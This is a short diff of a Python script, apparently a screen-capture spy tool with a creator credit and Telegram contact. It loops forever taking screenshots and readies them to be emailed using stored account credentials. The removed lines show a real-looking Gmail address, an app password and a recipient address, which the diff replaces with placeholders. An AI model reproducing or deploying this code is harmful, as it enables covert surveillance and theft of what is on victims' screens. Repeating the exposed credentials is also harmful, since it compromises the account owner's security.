@@ -1,4 +1,4 @@
-//Creator : AnonyMSAV Contact : https://t.me/Anony4790
+#Creator : AnonyMSAV Contact : https://t.me/Anony4790
 import time
 import pyautogui
 import os
@@ -9,9 +9,9 @@ def main():
     while True:
         ss = pyautogui.screenshot()
         ss.save('ss.png')
-        usr='kumara677678@gmail.com'
-        pas='gbwvdyaimudvjilr'
-        res='msav4790@gmail.com'
+        usr='Email <to>'
+        pas='' #App password of the google.
+        res='Email <from>'
         with open('ss.png', 'rb') as f:
             img_d=f.read()
             img_t=imghdr.what(f.name)
